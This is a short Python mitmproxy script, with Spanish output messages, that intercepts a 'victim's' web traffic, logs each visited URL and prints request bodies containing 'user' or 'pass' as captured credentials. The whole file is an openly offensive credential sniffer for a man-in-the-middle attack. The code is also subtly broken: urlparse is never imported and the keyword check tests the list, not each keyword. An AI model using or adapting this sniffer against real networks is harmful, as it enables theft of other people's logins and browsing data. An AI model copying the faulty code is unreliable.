#!/usr/bin/env python3

from mitmproxy import http
from mitmproxy import ctx

def has_keywords(data, keywords):
    return any(keywords in data for keyword in keywords)

def request(packet):
    url = packet.request.url
    parsed_url = urlparse(url)
    scheme = parsed_url.scheme
    domain = parsed_url.netloc
    path = parsed_url.path

    print(f"[+] URL visitada por la victima: {scheme}://{domain}{path}")

    keywords = ["user", "pass"]
    data  = packet.request.get_text()

    if has_keywords(data, keywords):
        print(f"\n[+] Posibles credenciales capturadas:\n{data}\n")

